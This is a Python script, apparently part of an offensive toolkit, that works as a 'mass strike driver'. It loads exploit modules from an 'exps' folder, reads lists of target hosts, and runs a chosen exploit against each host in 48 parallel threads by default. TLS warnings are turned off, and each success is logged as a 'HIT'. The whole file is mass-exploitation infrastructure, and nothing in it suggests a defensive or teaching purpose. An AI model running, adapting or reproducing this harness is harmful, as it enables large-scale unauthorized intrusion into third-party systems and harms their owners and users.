#!/usr/bin/env python3
"""generic mass strike driver v2 — as_completed counting, per-target timing"""
import sys, os, json, concurrent.futures as cf, random, time, importlib, threading

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "exps"))
import urllib3
urllib3.disable_warnings()

EXP = sys.argv[1]
FN = sys.argv[2]
LIMIT = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] != "0" else 0
WORKERS = int(sys.argv[4]) if len(sys.argv) > 4 else 48
INFILE = sys.argv[5] if len(sys.argv) > 5 else f"targets/{EXP}"

mod = importlib.import_module(EXP)

def fire(t):
    t0 = time.time()
    try:
        ok, msg = (mod.EXPS9[FN](t) if hasattr(mod, "EXPS9") else mod.EXPS11[FN](t))
        return t, ok, msg, time.time() - t0
    except Exception as e:
        return t, False, "EXC:" + repr(e)[:50], time.time() - t0

raw = []
for l in open(os.path.join(HERE, INFILE)):
    l = l.strip()
    if not l:
        continue
    try:
        d = json.loads(l)
        h = d.get("host") or l
        if "://" not in h:
            h = (d.get("proto") or "http") + "://" + h
        body = h.split("://", 1)[1]
        if ":" not in body:
            p = d.get("port")
            if p:
                h = f"{h}:{p}"
    except Exception:
        h = l
    raw.append(h)
seen = set(); hosts = []
for h in raw:
    k = h.strip().rstrip("/")
    if k not in seen:
        seen.add(k); hosts.append(h)
random.Random(11).shuffle(hosts)
if LIMIT:
    hosts = hosts[:LIMIT]
print(f"[{EXP}] {len(hosts)} uniq | {WORKERS}w | {time.strftime('%H:%M:%S')}", flush=True)

okc = done = 0
t_start = time.time()
futs = []
with cf.ThreadPoolExecutor(max_workers=WORKERS) as ex:
    for h in hosts:
        futs.append(ex.submit(fire, h))
    for fut in cf.as_completed(futs):
        t, ok, msg, el = fut.result()
        done += 1
        if ok:
            okc += 1
            print(f"  HIT :: {t} :: {str(msg)[:60]}", flush=True)
        if done <= 25 or done % 200 == 0:
            rate = done / (time.time() - t_start)
            print(f"  {done}/{len(hosts)} ok={okc} last={t[:48]} el={el:.1f}s {rate:.1f}/s", flush=True)
print(f"[{EXP}] DONE ok={okc}/{len(hosts)} in {int(time.time()-t_start)}s", flush=True)
